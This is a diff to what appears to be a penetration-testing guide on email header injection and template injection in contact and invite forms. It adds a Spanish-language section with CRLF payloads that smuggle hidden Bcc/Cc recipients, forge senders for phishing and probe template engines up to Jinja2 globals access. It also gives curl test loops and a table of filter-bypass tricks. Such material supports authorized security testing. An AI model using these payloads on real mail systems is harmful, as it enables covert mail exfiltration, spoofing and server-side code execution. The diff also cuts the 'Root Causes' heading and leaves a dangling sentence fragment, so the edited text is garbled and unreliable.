@@ -84,9 +84,63 @@ chains_with: [crlf-injection, password-reset]
 - `curl` for form submission with injected payloads.
 - `swaks` for direct SMTP-level testing when a mail server endpoint is directly reachable in scope.
 
-## Root Causes
+## Payloads & Detection Patterns
 
-- Email headers built via string concatenation of user input instead of using a mail library's structured header API (which validates/rejects CR/LF in header values).
+Guía de caza: una familia por sink de composición (header SMTP vs cuerpo/subject templado). El
+resultado casi nunca vuelve en la respuesta HTTP: la prueba vive en el **raw source** del inbox
+que controlas. Usa una dirección/marcador único por intento para dedup.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| SMTP header CRLF | `name=Test%0d%0aBcc:probe@yourdomain.com` | Añadir `Bcc`/`Cc` oculto (exfil del correo) |
+| Extra recipient | `victim@x%0d%0aCc:attacker@x`, `a@x,b@x` | Smuggling de destinatario adicional |
+| Header override | `subject=Hi%0d%0aX-Injected:%201` | Inyectar/sobrescribir un header arbitrario |
+| Sender spoof | `reply-to`/`from` con CRLF → `From:` forjado | Phishing con la reputación del dominio |
+| Arbitrary recipient | recipient field con externo no relacionado | Relay/spam vía infra de mail del target |
+| SSTI subject/body | `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` | Template injection en el mail renderizado |
+| SSTI escalation | Jinja2 `{{config}}`, `{{self.__init__.__globals__}}` | Escalar a lectura/exec (gate operador) |
+
+Surface signals que delatan la clase antes de inyectar:
+- Features: contacto, "invitar amigo", "compartir por email", reset de password, notificaciones.
+- Campos `name`, `subject`, `reply_to`, `recipient_email` que acaban en headers/cuerpo del correo.
+- El efecto NO aparece en la respuesta HTTP → hay que leer el raw source del inbox ("ver original").
+- Motor de template detectable por error filtrado (`jinja2`, `Freemarker`, `Velocity`, `Handlebars`).
+
+```bash
+# header injection: confirmar en el RAW SOURCE del inbox, no en la respuesta HTTP
+P="probe+$(date +%s)@yourdomain.com"
+curl -s -X POST https://target/contact \
+  --data-urlencode "name=Test%0d%0aBcc:$P" --data-urlencode "email=test@yourdomain.com" \
+  --data-urlencode "message=hi"
+# abrir el correo recibido → "ver original" → el Bcc como header real = hit (vs literal en body = N/A)
+```
+
+```bash
+# SSTI: el resultado evaluado aparece en el CUERPO del correo enviado, no en curl
+for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>'; do
+  curl -s -X POST https://target/contact \
+    --data-urlencode "name=$p" --data-urlencode "email=test@yourdomain.com" --data-urlencode "message=hi"
+done   # revisar inbox: 49 (no el literal) = SSTI Demonstrated
+```
+
+Vector ciego (el correo no vuelve a ti, p. ej. relay a tercero o preview remoto): incrusta el
+`payload_url` de un token OAST (`engine.oast`) en un campo que el motor pueda fetchar y correlaciona
+el callback; sin ese hit, queda **Inferred**.
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Strip de `\r\n` | Solo-LF `%0a` en vez de `%0d%0a` | Sendmail/qmail aceptan LF como separador |
+| Sanitiza name/subject | Inyectar vía `email`/`reply-to` field | No todos los campos pasan por la misma validación |
+| Mail lib con header API segura | Buscar concatenación manual pese a la API | El misuse del dev sigue siendo explotable |
+| Allowlist de recipient | Multi-recipient con coma/semicolon `a@x,b@x` | El parser SMTP expande la lista |
+| Filtro de `{{ }}` | Sintaxis alterna `${}`, `#{}`, `<%= %>` según motor | Probar todas las familias de template |
+| Match textual del payload | Encoded-word/quoted-printable/UTF-7 en header | Evade la comparación literal del WAF |
+
+ of user input instead of using a mail library's structured header API (which validates/rejects CR/LF in header values).
 - Recipient fields derived from user-controlled input with no allow-list against the account's own verified email.
 - Email body/subject rendered via a template engine with user input treated as template source instead of as data (classic SSTI root cause, just in an email-sending context instead of a web response).
 
